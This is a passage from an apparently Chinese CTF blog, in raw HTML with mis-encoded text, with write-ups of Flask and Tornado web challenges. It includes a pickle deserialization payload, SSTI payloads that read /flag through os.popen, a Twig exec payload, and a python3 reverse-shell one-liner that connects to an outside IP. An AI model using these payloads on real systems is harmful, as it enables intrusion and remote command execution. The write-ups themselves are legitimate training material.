class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706162426.png" alt=""></p><p>systemå¥½åƒè¢«ç¦ç”¨äº†ï¼Œæ¢æˆpopenå‡½æ•°</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163643.png" alt=""></p><h2 id="RootersCTF2019-I-â¤ï¸-Flask">RootersCTF2019 I_â¤ï¸_Flask</h2><h2 id="CSCCTF-2019-Qual-FlaskLight">CSCCTF 2019 Qual FlaskLight</h2><h2 id="pasecactf-2019-flask-ssti">pasecactf_2019 flask_ssti</h2><h2 id="CISCN2019-ååŒ—èµ›åŒº-Web2-ikun">CISCN2019 ååŒ—èµ›åŒº Web2 ikun</h2><h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3><ul><li>é€»è¾‘æ¼æ´</li><li>JWTä¼ªé€ </li><li>pickleååºåˆ—åŒ–</li></ul><h3 id="è§£é¢˜-v2">è§£é¢˜</h3><p>pythonè„šæœ¬å¯»æ‰¾LV6å•†å“æ‰€åœ¨é¡µé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4186a81c-5092-4d1c-b2c3-6d753ef436c7.node3.buuoj.cn/shop?page=&#123;&#125;&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;_xsrf&quot;</span>: <span class="string">&quot;2|9abd3196|175f180123b348c52281c861b9ea6ba9|1593758159&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JWT&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhMDFoIn0.xjww69DlZAtZw_26KzwvCZc&quot;</span></span><br><span class="line">           <span class="string">&quot;-WhNxACW3PuvxHlQQ2yg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;commodity_id&quot;</span>: <span class="string">&quot;2|1:0|10:1593758858|12:commodity_id|4:Nw&quot;</span></span><br><span class="line">                    <span class="string">&quot;==|42eb3fadf203ceac3f14f89b8e7a575d5350b31a29c08f6a939d099435027244 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">501</span>):</span><br><span class="line">    rq = requests.get(url=url.format(i), cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="keyword">in</span> rq.text:</span><br><span class="line">        print(url.format(i))</span><br></pre></td></tr></table></figure><p>è·‘å‡ºæ¥çš„ç»“æœæ˜¯<code>page=181</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703150520.png" alt=""></p><p>ä½†æ˜¯çœ‹åˆ°è¿™ä¸ªä»·æ ¼å¾ˆæ˜¾ç„¶æ˜¯è¦é€šè¿‡æŸç§æ¼æ´æ¥è´­ä¹°ï¼Œå…ˆæŠ“åŒ…ï¼Œçœ‹åˆ°å‚æ•°åæƒ³åˆ°ä¸¤ç§åŠæ³•ï¼Œä¸€æ˜¯ç›´æ¥æ”¹ä»·æ ¼ï¼ŒäºŒæ˜¯æ”¹æŠ˜æ‰£ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152451.png" alt=""></p><p>å°è¯•ä¹‹åå‘ç°æ”¹ä»·æ ¼æ²¡æœ‰ç”¨ï¼Œæ”¹æŠ˜æ‰£æç¤ºä¸æ˜¯admin</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152637.png" style="zoom:50%;" /><p>è¿™ä¸ªåœ°æ–¹å°±å¾ˆè‡ªç„¶æƒ³åˆ°è¦è¶Šæƒï¼Œä¿®æ”¹å¯†ç å¤„æ²¡æœ‰é€»è¾‘æ¼æ´ï¼Œä½†æ˜¯Cookieä¸­åŒ…å«JWTï¼Œæ”¾åˆ°jwt.ioç½‘å€ä¸Šè§£æåï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152814.png" alt=""></p><p>å¦‚æœæƒ³è¦ä¼ªé€ ä¸€ä¸ªadminçš„JWTéœ€è¦çŸ¥é“secretã€‚æ„Ÿè§‰è¿™ä¸ªåœ°æ–¹å°±æœ‰ç‚¹è„‘æ´äº†ï¼Œè¦ç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker">å·¥å…·</a>å»çˆ†ç ´ï¼Œæˆ‘è¿˜æ‰¾äº†å¾ˆä¹…çš„æ³¨å…¥ç‚¹ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152940.png" alt=""></p><p>å†å»ä¼ªé€ adminçš„JWT</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153100.png" alt=""></p><p>æ›´æ”¹cookieçš„å€¼</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153207.png" alt=""></p><p>æŸ¥çœ‹ä¸ªäººä¸­å¿ƒï¼Œå‡ºç°äº†ä¸€ä¸ªhint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703154225.png" alt=""></p><p>æŸ¥çœ‹æºç å‘ç°æºç åŒ…ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153940.png" alt=""></p><p>é¢˜ç›®æç¤ºäº†pickleï¼Œç›´æ¥å…¨å±€æœç´¢ï¼Œ<code>Admin.py</code>æœ‰pickleååºåˆ—åŒ–æ¼æ´</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160455.png" alt=""></p><p>åˆ©ç”¨è„šæœ¬ç”Ÿæˆpayloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„payloadæ”¾åˆ°éšè—çš„è¾“å…¥æ¡†é‡Œï¼Œåªéœ€å°†<code>hidden=&quot;hidden&quot;</code>åˆ é™¤å³å¯ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160604.png" alt=""></p><h2 id="SUCTF-2019-Pythonginx">SUCTF 2019 Pythonginx</h2><h2 id="WesternCTF2018-shring">WesternCTF2018 shring</h2><h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3><h3 id="è§£é¢˜-v3">è§£é¢˜</h3><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="TODO">TODO</h3><h2 id="æŠ¤ç½‘æ¯2018-easy-tornado">æŠ¤ç½‘æ¯2018 easy_tornado</h2><h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3><ul><li>tornado æ¨¡æ¿æ³¨å…¥</li></ul><h3 id="è§£é¢˜-v4">è§£é¢˜</h3><p>è¿™é“é¢˜å¾ˆé‡è¦çš„ä¸€ä¸ªåœ°æ–¹å°±æ˜¯è§‚å¯Ÿurl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;eca90b16e91faf8d52c04e7ef7e7a8fc</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”filehash=md5(cookie_secret+md5(filename))ï¼Œæ‰€ä»¥è¦æ‰¾åˆ°cookie_secretçš„å€¼ã€‚</p><p>å½“ä¸è¾“å…¥filehashå‚æ•°çš„æ—¶å€™ï¼Œurlæ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”é¡µé¢å›æ˜¾Errorï¼Œè¿™ä¸ªå°±éœ€è¦æ¯”è¾ƒæ•æ„Ÿçš„æ³¨æ„åˆ°è¿™é‡Œæ˜¯æ¨¡æ¿æ³¨å…¥çš„ç‚¹ã€‚</p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#3-Tornado">å‚è€ƒæ–‡ç« </a>ç”¨çš„å°±æ˜¯handler.settingså¯¹è±¡</p><blockquote><p>handler æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ã€‚</p></blockquote><p>æ‰€ä»¥ä¼ é€’<code>error?msg=&#123;&#123; handler.settings &#125;&#125;</code>å¾—åˆ°cookie_secretã€‚</p><h2 id="HCTF-2018-Hideandseek">HCTF 2018 Hideandseek</h2><h3 id="TODO-v2">TODO</h3><h2 id="CISCN2019-æ€»å†³èµ›-Day1-Web3-Flask-Message-Board">[CISCN2019 æ€»å†³èµ› Day1 Web3]Flask Message Board</h2><h3 id="TODO-v3">TODO</h3><h2 id="HCTF2018-Admin">HCTF2018 Admin</h2><p>å‡ºé¢˜äººwriteupï¼š<a href="https://www.ckj123.com/?p=147">https://www.ckj123.com/?p=147</a></p><h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3><ul><li>Flask Sessionä¼ªé€ </li><li>Unicodeæ¬ºéª—</li><li>æ¡ä»¶ç«äº‰</li></ul><h3 id="è§£é¢˜-v5">è§£é¢˜</h3><h4 id="æ–¹æ³•ä¸€-Unicodeç¼–ç æ¬ºéª—">æ–¹æ³•ä¸€ Unicodeç¼–ç æ¬ºéª—</h4><p>ç»“åˆæ”¹å¯†ç çš„åŠŸèƒ½ï¼Œçœ‹ä¸€ä¸‹<code>change</code>å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç¬¬6è¡Œçš„<code>strlower</code>æ˜¯è‡ªå·±å°è£…çš„ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨Pythonçš„åº“å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>nodeprep</code> æ¥è‡ª <code>twisted.words.protocols.jabber.xmpp_stringprep</code>ã€‚</p><p>å¹¶ä¸”åœ¨æ³¨å†Œå’Œç™»å½•çš„ä»£ç ä¸­éƒ½ä½¿ç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨<code>ADMIN</code>ç»•è¿‡ã€‚</p><p>è¿™é‡Œæœ‰ä¸€ç¯‡æ–‡ç« è®²åˆ°äº†nodeprepå…³äºUnicodeç¼–ç çš„é—®é¢˜ï¼š</p><blockquote><p><a href="https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e">https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e</a></p></blockquote><p>ä½¿ç”¨ä¸¤æ¬¡<code>nodeprep.prepare</code>å‡½æ•°ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">á´¬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure><blockquote><p>Unicode â€”&gt; ä¸­æ–‡ï¼š<a href="https://tool.chinaz.com/tools/unicode.aspx">https://tool.chinaz.com/tools/unicode.aspx</a></p></blockquote><p>å³ç¬¬ä¸€æ¬¡å°†å…¶è½¬æ¢ä¸ºå¤§å†™ï¼Œç¬¬äºŒæ¬¡å°†å…¶è½¬æ¢ä¸ºå°å†™ã€‚</p><p>æ€è·¯ï¼š</p><ul><li>æ³¨å†Œç”¨æˆ·á´¬dmin</li><li>ç™»å½•ç”¨æˆ·á´¬dminï¼Œå˜æˆAdmin</li><li>ä¿®æ”¹å¯†ç Adminï¼Œæ›´æ”¹äº†adminçš„å¯†ç </li></ul><h4 id="æ–¹æ³•äºŒ-Flask-session-ä¼ªé€ ">æ–¹æ³•äºŒ Flask session ä¼ªé€ </h4><blockquote><p>åŸç†ï¼š<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>å·¥å…·ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223051.png" alt=""></p><p>ä¿®æ”¹<code>name</code>ä¸º<code>admin</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;6604bc7a9890f6bf08233451da34826f785818ecb989720b4c7e7aa4f22105e0b28a5122c9e9b490f8c9609baa8efab128409afc0a7ce5ba93ccd50994d78d37&#39;, &#39;csrf_token&#39;: b&#39;135d7b0b615153fd276627d995e71a0026f75bb3&#39;, &#39;image&#39;: b&#39;mwPn&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure><p>å†å¯¹å…¶è¿›è¡Œencodeæ“ä½œï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223440.png" alt=""></p><p>æ›´æ”¹cookieçš„å€¼ï¼š</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223656.png" style="zoom:67%;" /><p>æäº¤æ›´æ”¹ï¼Œåˆ·æ–°é¡µé¢ï¼ŒæˆåŠŸè·å–flag~</p><h4 id="æ–¹æ³•ä¸‰-æ¡ä»¶ç«äº‰">æ–¹æ³•ä¸‰ æ¡ä»¶ç«äº‰</h4><blockquote><p><a href="https://tmr.js.org/p/3a03e44b/">https://tmr.js.org/p/3a03e44b/</a></p><p>ä¸ç”±çš„æ„Ÿå¹è¿™äº›äººçš„è„‘å­æ€ä¹ˆè¿™ä¹ˆå¥½ä½¿ã€‚ã€‚ã€‚ğŸ˜‚</p></blockquote><h2 id="BJDCTF-2nd-fake-google">BJDCTF 2nd fake google</h2><h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3><ul><li>Flask SSTI æ–‡ä»¶è¯»å–</li></ul><h3 id="è§£é¢˜-v6">è§£é¢˜</h3><p>è¿™é“é¢˜å°±æ˜¯æ¯”è¾ƒæ˜æ˜¾çš„Flask æ¨¡æ¿æ³¨å…¥æ¼æ´äº†ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆç»•è¿‡ï¼Œç›´æ¥ä¸Špayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__&#x3D;&#x3D;%27catch_warnings%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27].eval(&quot;__import__(%27os%27).popen(%27cat%20&#x2F;flag%27).read()&quot;)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-stable">BJDCTF2020 Cookie is stable</h2><h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3><ul><li>Python Twigæ¨¡æ¿æ³¨å…¥</li></ul><h3 id="è§£é¢˜-v7">è§£é¢˜</h3><p>å’Œä¸Šé¢˜ä¸€æ ·æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œä¸è¿‡æ³¨å…¥ç‚¹åœ¨Cookieé‡Œ</p><p>æ¸²æŸ“å¼•æ“ä¹Ÿæ¢æˆäº†åŸºäºPythonçš„Twig</p><p>ä»ç½‘ä¸Šæ‰¾åˆ°çš„ Twig poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id=""></h3><h2 id="V-Nå…¬å¼€èµ›-CheckIn">V&amp;Nå…¬å¼€èµ› CheckIn</h2><h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3><ul><li>åå¼¹shell</li><li>æ–‡ä»¶æè¿°ç¬¦</li></ul><h3 id="è§£é¢˜-v8">è§£é¢˜</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>shellè·¯ç”±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œå‘½ä»¤ä¹‹å‰flag.txtå·²ç»è¢«åˆ é™¤äº†ï¼Œå¹¶ä¸”ä¸èƒ½å›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚</p><p>é¦–å…ˆè‚¯å®šæ˜¯æƒ³åˆ°åå¼¹ä¸€ä¸ªshellï¼Œç”¨BUUå°å·å¼€ä¸€ä¸ªLinuxä¸»æœºï¼Œå°è¯•æœ‰bashã€curlã€ncã€python -cç­‰ï¼Œä½†æ˜¯è¿™é‡Œæµ‹è¯•åå‘ç°è¿™äº›å¸¸ç”¨çš„å‘½ä»¤éƒ½è¢«ç¦äº†ï¼Œæ— æ³•åå¼¹Shellã€‚æœ€åå†æ¢æˆpython3å°±å¯ä»¥æˆåŠŸåå¼¹shellï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc5fa49b-316a-47e1-8737-20050c013abe.node3.buuoj.cn&#x2F;shell?c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.2.25.118%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çš„ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æ¥æ¢å¤æ–‡ä»¶ã€‚</p><blockquote><p>ä»€ä¹ˆæ˜¯æ–‡ä»¶æè¿°ç¬¦</p><p>ä¾‹å¦‚Pythonä¸­ï¼Œå½“æˆ‘ä»¬open()å‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ä¾¿åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œåå¯¹è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä½¿ç”¨read()å‡½æ•°ä¾¿æ˜¯è¯»å–æ–‡ä»¶æè¿°ç¬¦ä¸­çš„å†…å®¹ï¼Œclose()å‡½æ•°ç”¨äºå…³é—­/é”€æ¯è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚</p><p>æ–‡ä»¶æè¿°ç¬¦å‚¨å­˜åœ¨ä»€ä¹ˆåœ°æ–¹ï¼š</p><p><code>/proc/&lt;pid&gt;/fd/&lt;id&gt;</code></p></blockquote><p>æŸ¥çœ‹<code>/proc</code>ç›®å½•ä¸‹çš„è¿›ç¨‹å·</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102353.png" alt=""></p><p>æŸ¥çœ‹è¿›ç¨‹å·ç­‰äº10ä¸‹é¢çš„fdç›®å½•</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102509.png" 